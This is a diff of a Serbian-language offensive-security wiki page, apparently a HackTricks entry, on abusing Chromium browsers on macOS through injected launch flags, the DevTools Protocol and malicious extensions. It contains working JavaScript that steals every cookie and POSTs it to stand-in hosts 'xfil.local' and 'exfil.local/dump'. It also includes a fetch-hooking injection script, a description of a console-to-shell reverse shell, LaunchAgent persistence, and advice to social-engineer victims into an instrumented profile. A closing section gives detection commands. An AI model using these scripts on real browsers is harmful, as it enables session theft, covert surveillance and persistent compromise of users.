@@ -4,36 +4,45 @@
 
 ## Osnovne informacije
 
-Chromium-based browsers like Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, and Opera svi koriste iste command-line switches, preference fajlove i DevTools automation interfejse. Na macOS-u, svaki korisnik sa GUI pristupom može terminirati postojeću browser sesiju i ponovo je otvoriti sa proizvoljnim flags, ekstenzijama ili DevTools endpoint-ima koji se izvršavaju sa entitlements cilja.
+Chromium-based browseri kao što su Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera koriste iste command-line switches, preference files i DevTools automation interfaces. Na macOS-u, svaki user sa GUI access-om može da terminira postojeću browser sesiju i ponovo je pokrene sa proizvoljnim flags, extensions ili DevTools endpoints koji rade sa entitlements ciljanog usera.
 
-#### Pokretanje Chromium-a sa prilagođenim zastavicama na macOS
+#### Pokretanje Chromium-a sa custom flags na macOS-u
 
-macOS održava jednu UI instancu po Chromium profilu, tako da instrumentacija obično zahteva prisilno zatvaranje browser-a (na primer sa `osascript -e 'tell application "Google Chrome" to quit'`). Napadači obično ponovo pokreću preko `open -na "Google Chrome" --args <flags>` kako bi injektovali argumente bez modifikovanja app bundle-a. Uvijanje te komande unutar korisničkog LaunchAgent-a (`~/Library/LaunchAgents/*.plist`) ili login hook-a garantuje da će kompromitovani browser biti ponovno pokrenut nakon reboot/logoff-a.
+macOS održava jednu UI instancu po Chromium profilu, pa instrumentation obično zahteva force-closing browsera (na primer pomoću `osascript -e 'tell application "Google Chrome" to quit'`). Attackers obično ponovo pokreću browser pomoću `open -na "Google Chrome" --args <flags>` kako bi injectovali arguments bez menjanja app bundle-a. Umotavanje te komande u user LaunchAgent (`~/Library/LaunchAgents/*.plist`) ili login hook garantuje da će se tampered browser ponovo pokrenuti nakon reboot-a/logoff-a.
 
-#### `--load-extension` zastavica
+#### `--load-extension` Flag
 
-`--load-extension` flag automatski učitava unpacked extensions (putanje odvojene zarezom). Kombinujte ga sa `--disable-extensions-except` da blokirate legitimne ekstenzije dok forsirate da samo vaš payload radi. Maliciozne ekstenzije mogu zatražiti visokorizične permisije kao što su `debugger`, `webRequest`, i `cookies` da bi pivotirale u DevTools protocols, patch-ovale CSP headers, downgrade-ovale HTTPS ili eksfiltrirale session materijal čim browser startuje.
+`--load-extension` flag automatski učitava unpacked extensions (putanje razdvojene zarezima). Kombinujte ga sa `--disable-extensions-except` kako biste blokirali legitimne extensions i primorali browser da pokrene samo vaš payload. Malicious extensions mogu zahtevati high-impact permissions kao što su `debugger`, `webRequest` i `cookies` kako bi se pivotovali u DevTools protocols, menjali CSP headers, downgrade-ovali HTTPS ili exfiltrated session material čim se browser pokrene.
 
-#### `--remote-debugging-port` / `--remote-debugging-pipe` zastavice
+#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags
 
-Ovi switch-evi izlažu Chrome DevTools Protocol (CDP) preko TCP-a ili pipe-a tako da eksterni alati mogu upravljati browser-om. Google je uočio široku zloupotrebu ovog interfejsa od strane infostealera i, počevši od Chrome 136 (March 2025), switch-evi se ignorišu za default profile osim ako browser nije pokrenut sa non-standard `--user-data-dir`. Ovo nameće App-Bound Encryption na pravim profilima, ali napadači i dalje mogu spawn-ovati nov profil, naterati žrtvu da se autentifikuje u njemu (phishing/triage assistance), i harvest-ovati cookies, tokene, device trust state-ove, ili WebAuthn registracije preko CDP-a.
+Ovi switches izlažu Chrome DevTools Protocol (CDP) preko TCP-a ili pipe-a, tako da eksterni tooling može da upravlja browserom. Google je uočio široko rasprostranjenu infostealer zloupotrebu ovog interface-a i, počevši od Chrome-a 136 (mart 2025), ovi switches se ignorišu za default profile osim ako je browser pokrenut sa nestandardnim `--user-data-dir`. Ovo primenjuje App-Bound Encryption na realne profile, ali attackers i dalje mogu da pokrenu fresh profile, navedu victim-a da se autentifikuje unutar njega (phishing/triage assistance) i harvestuju cookies, tokens, device trust states ili WebAuthn registrations putem CDP-a.
 
-#### `--user-data-dir` zastavica
+#### `--user-data-dir` Flag
 
-Ova zastavica preusmerava ceo browser profil (History, Cookies, Login Data, Preference fajlovi, itd.) na putanju pod kontrolom napadača. Neophodna je kada se kombinuju moderni Chrome build-ovi sa `--remote-debugging-port`, i takođe drži kompromitovani profil izolovanim tako da možete ubaciti prethodno popunjene `Preferences` ili `Secure Preferences` fajlove koji onemogućavaju security prompts, auto-install ekstenzija i menjaju default schemes.
+Ovaj flag preusmerava ceo browser profile (History, Cookies, Login Data, Preference files itd.) na path pod kontrolom attackera. Obavezan je pri kombinovanju modernih Chrome builds sa `--remote-debugging-port`, a takođe održava tampered profile izolovanim, tako da možete ubaciti unapred popunjene `Preferences` ili `Secure Preferences` files koje onemogućavaju security prompts, automatski instaliraju extensions i menjaju default schemes.
 
-#### `--use-fake-ui-for-media-stream` zastavica
+#### `--use-fake-ui-for-media-stream` Flag
 
-Ovaj switch zaobilazi camera/mic permission prompt tako da svaka stranica koja pozove `getUserMedia` odmah dobija pristup. Kombinujte ga sa flag-ovima kao što su `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, ili CDP `Browser.grantPermissions` komandama da tihо snimate audio/video, delite desktop, ili zadovoljite WebRTC permission provere bez korisničke interakcije.
+Ovaj switch zaobilazi permission prompt za kameru/mikrofon, tako da svaka stranica koja pozove `getUserMedia` odmah dobija access. Kombinujte ga sa flags kao što su `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ili CDP `Browser.grantPermissions` commands da biste nečujno capture-ovali audio/video, delili ekran ili zadovoljili WebRTC permission checks bez interakcije sa userom.
+
+## Delivery & Relaunch Patterns Seen in the Wild
+
+CDP abuse je obično **post-exploitation** faza, a ne initial payload. Nedavna macOS kampanja usmerena na developere koristila je poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`), tako da se code izvršavao samo kada victim **build-uje** projekat, a ne kada ga samo clone-uje ili otvori. Nakon tog prvog izvršavanja, malware je takođe inficirao druga `.xcodeproj` stabla, dodao malicious Git `pre-commit` hooks i pretraživao ZIP archives u potrazi za dodatnim Xcode projects.
+
+Kod Chromium abuse-a ovo je važno zato što attacker ne mora da patch-uje sam browser binary. Kratkotrajni build-phase / `osascript` stager umesto toga može da instalira **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher itd.) koji ponovo otvara legitimni browser sa flags pod kontrolom attackera svaki put kada ga user pokrene.
+
+> [!TIP]
+> Na developer endpoints, proverite `.pbxproj` files, `.git/hooks/pre-commit` i ZIPs koji sadrže `.xcodeproj` zbog neočekivanih `curl`, `osascript`, `xxd`, ugnježdenih `base64` ili Chrome relaunch logike.
 
 ## Remote Debugging & DevTools Protocol Abuse
 
-Kada je Chrome ponovo pokrenut sa dedikovanim `--user-data-dir` i `--remote-debugging-port`, možete se priključiti preko CDP-a (npr. preko `chrome-remote-interface`, `puppeteer`, ili `playwright`) i skriptovati visokoprigorske radne tokove:
+Kada se Chrome ponovo pokrene sa namenskim `--user-data-dir` i `--remote-debugging-port`, možete se povezati preko CDP-a (npr. pomoću `chrome-remote-interface`, `puppeteer` ili `playwright`) i script-ovati workflows sa visokim privilegijama:
 
-- **Krađa cookie-/sesije:** `Network.getAllCookies` i `Storage.getCookies` vraćaju HttpOnly vrednosti čak i kada bi App-Bound encryption obično blokirala filesystem pristup, zato što CDP traži od pokrenutog browser-a da ih dekriptira.
-- **Manipulacija permisijama:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` omogućavaju zaobilaženje camera/mic promptova (posebno u kombinaciji sa `--use-fake-ui-for-media-stream`) ili falsifikovanje provera zasnovanih na lokaciji.
-- **Injekcija keystroke/script-a:** `Runtime.evaluate` izvršava proizvoljan JavaScript unutar aktivnog taba, omogućavajući podizanje kredencijala, patch-ovanje DOM-a, ili injektovanje persistence beacon-a koji prežive navigaciju.
-- **Live eksfiltracija:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` presreću autentifikovane zahteve/odgovore u realnom vremenu bez diranja disk artefakata.
+- **Cookie/session theft:** `Network.getAllCookies` i `Storage.getCookies` vraćaju HttpOnly vrednosti čak i kada bi App-Bound encryption uobičajeno blokirao filesystem access, zato što CDP traži od browsera koji radi da ih dekriptuje.
+- **Permission tampering:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` omogućavaju zaobilaženje camera/mic prompts (posebno u kombinaciji sa `--use-fake-ui-for-media-stream`) ili falsifikovanje location-based security checks.
+- **Keystroke/script injection:** `Runtime.evaluate` izvršava proizvoljni JavaScript unutar aktivnog taba, omogućavajući credential lifting, DOM patching ili injectovanje persistence beacons koji preživljavaju navigaciju.
+- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` presreću authenticated requests/responses u realnom vremenu bez dodirivanja disk artifacts.
 ```javascript
 import CDP from 'chrome-remote-interface';
 
@@ -47,17 +56,42 @@ await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST',
 await client.close();
 })();
 ```
-Pošto Chrome 136 blokira CDP na podrazumevanom profilu, kopiranje/premještanje postojeće direktorijume žrtve `~/Library/Application Support/Google/Chrome` u staging putanju više ne daje dešifrovane cookies. Umesto toga, social-engineer korisnika da se prijavi unutar instrumentisanog profila (npr. „korisna“ sesija podrške) ili presretnite MFA tokene u tranzitu putem CDP-controlled network hooks.
+Pošto Chrome 136 blokira CDP na podrazumevanom profilu, kopiranje postojeće `~/Library/Application Support/Google/Chrome` fascikle žrtve na staging putanju više ne daje dekriptovane cookies. Umesto toga, socijalnim inženjeringom navedite korisnika da se autentifikuje unutar instrumentiranog profila (npr. „korisna“ support sesija) ili presretanjем MFA tokena tokom prenosa putem CDP-controlled network hooks.
 
-## Extension-Based Injection via Debugger API
+### XCSSET-style CDP Backdoor Chain
 
-The 2023 "Chrowned by an Extension" research demonstrated that a malicious extension using the `chrome.debugger` API can attach to any tab and gain the same DevTools powers as `--remote-debugging-port`. That breaks the original isolation assumptions (extensions stay in their context) and enables:
+Praktičan obrazac malware-a je:
 
-- Tiho krađа cookies i kredencijala pomoću `Network.getAllCookies`/`Fetch.getResponseBody`.
-- Izmena dozvola sajta (camera, microphone, geolocation) i zaobilaženje security interstitiala, što omogućava phishing stranicama da se predstavljaju kao Chrome dijalozi.
-- On-path manipulacija TLS upozorenjima, preuzimanjima ili WebAuthn promptovima programatskim upravljanjem `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, ili `Security.handleCertificateError`.
+1. Ponovo pokrenuti userland implant ili wrapper svaki put kada se Chrome pokrene.
+2. Pokrenuti legitimni browser sa `--remote-debugging-port=<port>` i, na Chrome 136+, obično uparenim non-default `--user-data-dir=<dir>`.
+3. Pokrenuti helper koji se povezuje na lokalni CDP WebSocket i registruje pre-document hook pomoću `Page.addScriptToEvaluateOnNewDocument`.
 
-Učitajte extension pomoću `--load-extension`/`--disable-extensions-except` tako da nije potrebna interakcija korisnika. Minimalan background script koji weaponizuje API izgleda ovako:
+Taj helper može da ubaci JavaScript **pre** nego što se pokrene kod sajta, što je idealno za hook-ovanje `window.fetch`, `XMLHttpRequest`, wallet provajdera ili autofill tokova bez izmene fajlova na disku.
+```javascript
+await Page.enable();
+await Runtime.enable();
+await Page.addScriptToEvaluateOnNewDocument({
+source: `
+const oldFetch = window.fetch;
+window.fetch = async (...args) => {
+console.log('__HT__' + JSON.stringify(args[0]));
+return oldFetch(...args);
+};
+`
+});
+Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
+```
+Još jača varijanta pretvara browser u **host command bridge**: ubačeni JavaScript emituje `console.log` sa delimiter markerom, lokalni helper prati `Runtime.consoleAPICalled`, uklanja marker, izvršava ostatak kroz host shell (na primer Go-ov `exec.Command`) i vraća stdout/stderr preko napadačevog WebSocket-a. Ovo nadograđuje izvršavanje skripti na nivou taba u uglavnom fileless reverse shell.
+
+## Injection zasnovan na Extension-u putem Debugger API-ja
+
+Istraživanje „Chrowned by an Extension“ iz 2023. godine pokazalo je da malicious extension koji koristi `chrome.debugger` API može da se poveže na bilo koji tab i dobije iste DevTools privilegije kao `--remote-debugging-port`. Time se narušavaju prvobitne pretpostavke o izolaciji (extensions ostaju u svom kontekstu) i omogućava:
+
+- Tiha krađa cookies i credentials pomoću `Network.getAllCookies`/`Fetch.getResponseBody`.
+- Izmena site permissions (kamera, mikrofon, geolokacija) i zaobilaženje security interstitial-a, čime phishing stranice mogu da oponašaju Chrome dijaloge.
+- Tampering upozorenja za TLS, downloads ili WebAuthn prompt-ova preko programskog upravljanja funkcijama `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ili `Security.handleCertificateError`.
+
+Učitajte extension pomoću `--load-extension`/`--disable-extensions-except`, tako da nije potrebna nikakva interakcija korisnika. Minimalni background script koji weaponize-uje API izgleda ovako:
 ```javascript
 chrome.tabs.onUpdated.addListener((tabId, info) => {
 if (info.status !== 'complete') return;
@@ -69,13 +103,25 @@ fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cook
 });
 });
 ```
-Ekstenzija se takođe može pretplatiti na `Debugger.paused` događaje da bi čitala JavaScript promenljive, patch-ovala inline skripte ili ubacivala custom breakpoints koji opstaju kroz navigaciju. Pošto sve radi unutar korisničke GUI sesije, Gatekeeper i TCC se ne aktiviraju, što ovu tehniku čini idealnom za malware koji je već izvršen u korisničkom kontekstu.
+Ekstenzija takođe može da se pretplati na događaje `Debugger.paused` kako bi čitala JavaScript promenljive, menjala inline skripte ili dodavala prilagođene tačke prekida koje opstaju tokom navigacije. Pošto se sve izvršava unutar korisničke GUI sesije, Gatekeeper i TCC se ne aktiviraju, što ovu tehniku čini idealnom za malware koji je već postigao izvršavanje u kontekstu korisnika.
 
+## Detekcija i Hunting
+
+- Upozorite na Chromium pregledače pokrenute sa `--remote-debugging-port`, `--remote-debugging-pipe` ili sumnjivim `--user-data-dir`, naročito kada je roditeljski proces `bash`, `sh`, `osascript`, `xcodebuild` ili LaunchAgent helper.
+- Potražite kratke nizove procesa u kojima helper otvara lokalni CDP WebSocket, registruje `Page.addScriptToEvaluateOnNewDocument`, a zatim uspostavlja dugotrajnu odlaznu WebSocket/HTTPS vezu.
+- Istražite console-to-shell mostove korelisanjem aktivnosti pregledača `Runtime.consoleAPICalled` sa child shell procesima ili helper procesima koji izvršavaju komande koje je dostavio attacker.
+- Na Mac računarima developera proverite `.pbxproj` `PBXShellScriptBuildPhase` unose, Git `pre-commit` hook-ove, Dock/login item relaunchere i Xcode projekte sadržane u ZIP arhivama zbog instalacije browser wrapper-a.
+```bash
+ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
+lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
+find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
+rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
+```
 ### Alati
 
-- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizuje pokretanja Chromium-a sa payload extensions i izlaže interaktivne CDP hooks.
-- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Sličan tooling fokusiran na traffic interception i browser instrumentation za macOS operatore.
-- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js biblioteka za skriptovanje Chrome DevTools Protocol dumps (cookies, DOM, permissions) kada je instanca pokrenuta sa `--remote-debugging-port`.
+- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizuje pokretanje Chromium-a sa payload ekstenzijama i izlaže interaktivne CDP hooks.
+- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Sličan alat fokusiran na presretanje saobraćaja i browser instrumentation za macOS operatore.
+- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js biblioteka za automatizaciju Chrome DevTools Protocol dump-ova (cookies, DOM, permissions) nakon što je instanca sa `--remote-debugging-port` aktivna.
 
 ### Primer
 ```bash
@@ -92,10 +138,13 @@ open -na "Google Chrome" --args \
 # Intercept traffic
 voodoo intercept -b chrome
 ```
-Pronađite više primera u linkovima alata.
+Pronađite još primera u linkovima ka alatima.
 
 ## Reference
 
+- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
+- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
+- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
 - [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
 - [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
 - [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)
